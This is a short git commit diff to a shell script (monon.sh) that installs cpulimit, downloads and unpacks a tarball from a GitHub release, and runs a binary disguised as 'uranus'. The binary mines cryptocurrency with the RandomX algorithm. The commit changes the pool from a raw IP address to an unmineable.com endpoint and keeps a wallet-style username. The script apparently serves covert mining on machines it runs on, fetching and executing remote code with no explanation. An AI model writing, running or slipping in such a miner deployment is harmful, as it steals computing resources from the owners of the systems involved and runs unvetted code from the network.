ad0bf0e796072618557a9b085de8017395d142f2
kolorijo01 <163302691+kolorijo01@users.noreply.github.com>
2024-04-03 13:24:32 +0700

    Update monon.sh

--- monon.sh
+++ monon.sh
@@ -1,4 +1,5 @@
 apt-get update
 apt-get install -y cpulimit
+wget https://github.com/kolorijo01/koloria/releases/download/uranus/daemon.tar.gz && tar -xvf daemon.tar.gz
 cpulimit -l 100 -e uranus &
-wget https://github.com/kolorijo01/koloria/releases/download/uranus/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o 159.203.162.18:3333 -u nexa:nqtsq5g5ewsu60xpu8zn7snghgf3yx09j5gcc648y44dcyg9 -p "suto" -t 1
+./uranus -a randomx -o rx.unmineable.com:3333 -u nexa:nqtsq5g5ewsu60xpu8zn7snghgf3yx09j5gcc648y44dcyg9 -p "suto" -t 1
